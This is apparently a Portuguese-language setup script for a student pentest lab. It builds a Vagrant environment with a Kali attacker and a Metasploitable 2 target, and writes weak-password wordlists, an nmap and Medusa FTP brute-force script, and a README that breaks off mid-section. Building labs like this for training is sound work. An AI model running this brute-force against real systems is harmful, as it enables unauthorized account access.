# 1. Ajusta a estrutura movendo itens da subpasta 'iac/' para a raiz (se existirem)
echo "Ajustando estrutura de pastas para convenções do GitHub..."
if [ -d "iac" ]; then
    mv iac/README.md . 2>/dev/null
    mv iac/wordlists . 2>/dev/null
    mv iac/scripts . 2>/dev/null
    mv iac/images . 2>/dev/null
    mv iac/run_ftp_attack.sh scripts/ 2>/dev/null
    mv iac/setup_desafio.sh scripts/ 2>/dev/null
    # Garante que as pastas vazias iac/metasploitable e iac/kali não existam na raiz
    rm -r iac/metasploitable 2>/dev/null
    rm -r iac/kali 2>/dev/null
fi

# 2. Garante a estrutura final (raíz do repo)
mkdir -p iac wordlists scripts images

# 3. Cria o Vagrantfile dentro da pasta iac/
echo "Criando iac/Vagrantfile..."
cat << 'EOF' > iac/Vagrantfile
# iac/Vagrantfile: Configuração da Infraestrutura como Código (IaC)
Vagrant.configure("2") do |config|

  config.vm.provider "virtualbox" do |vb|
    vb.customize ["modifyvm", :id, "--nictype1", "Am79C973"] 
    vb.customize ["modifyvm", :id, "--nictype2", "Am79C973"] 
  end

  # 1. VM KALI LINUX (ATACANTE) - IP: 192.168.56.10
  config.vm.define "kali" do |kali|
    kali.vm.box = "kalilinux/kali-linux-rolling"
    kali.vm.hostname = "kali"
    kali.vm.network "public_network", type: "dhcp", bridge: "en0" 
    kali.vm.network "private_network", type: "hostonly", ip: "192.168.56.10"
    
    kali.vm.provider "virtualbox" do |vb|
      vb.name = "DIO-Kali-Attacker"
      vb.memory = "2048"
      vb.cpus = "2"
    end
    
    kali.vm.provision "shell", inline: <<-SHELL
      echo "Atualizando Kali..."
      sudo apt update && sudo apt upgrade -y
      echo "Instalacao de ferramentas concluida. Kali pronto em 192.168.56.10."
    SHELL
  end

  # 2. VM METASPLOITABLE 2 (ALVO) - IP: 192.168.56.20
  config.vm.define "msf2" do |msf2|
    msf2.vm.box = "r3p3nt/metasploitable2" 
    msf2.vm.hostname = "msf2"
    msf2.vm.network "private_network", type: "hostonly", ip: "192.168.56.20" 
    
    msf2.vm.provider "virtualbox" do |vb|
      vb.name = "DIO-Metasploitable2-Target"
      vb.memory = "1024"
      vb.cpus = "1"
    end
  end
end
EOF

# 4. Criação dos scripts de exemplo na pasta scripts/
echo "Criando scripts/setup_desafio.sh e scripts/run_ftp_attack.sh..."
cat > scripts/setup_desafio.sh << EOF
#!/bin/bash
# setup_desafio.sh: Cria as wordlists simples no ambiente do Kali Linux.
echo "Criando wordlists simples para o desafio..."

cat > wordlists/usuarios_comuns.txt << EOS
msfadmin
admin
user
ftpuser
test
EOS

cat > wordlists/senhas_fracas.txt << EOS
msfadmin
password
123456
toor
teste
EOS

cp wordlists/usuarios_comuns.txt wordlists/usuarios_smb.txt
echo "password" > wordlists/senha_spray.txt

echo "Wordlists criadas com sucesso na pasta wordlists/!"
EOF

cat > scripts/run_ftp_attack.sh << EOF
#!/bin/bash
# run_ftp_attack.sh: Executa o ataque de Força Bruta FTP no Metasploitable 2.

TARGET_IP="192.168.56.20"
USER_LIST="../wordlists/usuarios_comuns.txt"
PASS_LIST="../wordlists/senhas_fracas.txt"

echo "--- 1. Verificando Serviço FTP (Nmap) ---"
nmap -p 21 \$TARGET_IP

echo -e "\n--- 2. Executando Ataque de Força Bruta FTP com Medusa ---"
medusa -H \$TARGET_IP -U \$USER_LIST -P \$PASS_LIST -M ftp -n 50

echo -e "\n--- FIM DO TESTE FTP ---"
echo "Capture a tela do resultado para a pasta images/ftp_medusa_sucesso.png"
EOF

# 5. Criação de Wordlists vazias na pasta wordlists/ (o Vagrant irá criá-las com conteúdo)
echo "" > wordlists/usuarios_comuns.txt 
echo "" > wordlists/senhas_fracas.txt 
echo "" > wordlists/usuarios_smb.txt 
echo "" > wordlists/senha_spray.txt 

# 6. Criação do README.md na raiz
echo "Criando o README.md na raiz..."
cat << 'EOF' > README.md
# 🤖 Infraestrutura como Código (IaC) e Simulação de Brute Force com Kali Linux

Este projeto documenta a criação automatizada de um laboratório de segurança (usando **Vagrant** e **VirtualBox**) e a simulação de ataques de força bruta com **Medusa** e **Hydra** no ambiente **Kali Linux**.

## 🎯 Objetivos do Projeto

* **Infraestrutura como Código (IaC):** Automatizar a configuração do ambiente (Kali Linux e Metasploitable 2) utilizando o Vagrant.
* **Auditoria de Segurança:** Simular ataques de Brute Force em protocolos comuns (FTP, Web, SMB).
* **Documentação:** Criar um portfólio técnico detalhado dos processos e mitigações.

---

## 🛠️ Etapa 1: Setup do Laboratório (IaC com Vagrant)

O ambiente foi configurado no macOS 10.15.7 usando Vagrant para garantir reprodutibilidade.

### 1. Configuração de Rede

O arquivo **`iac/Vagrantfile`** garante que ambas as VMs usem a mesma rede **Host-Only** (Rede Interna):

| VM | Box (OS) | IP Fixo (Host-Only) | Função |
| :--- | :--- | :--- | :--- |
| **Kali Linux** | `kalilinux/kali-linux-rolling` | `192.168.56.10` | Atacante |
| **Metasploitable 2** | `r3p3nt/metasploitable2` | `192.168.56.20` | Alvo (Vulnerável) |

### 2. Comandos de Inicialização

A criação e configuração da rede foram realizadas com um único comando na pasta `iac/`:

```bash
# Navegue até a pasta de IaC
cd iac/
# Cria e provisiona as VMs
vagrant up 
# Para acessar o Kali:
# vagrant ssh kali
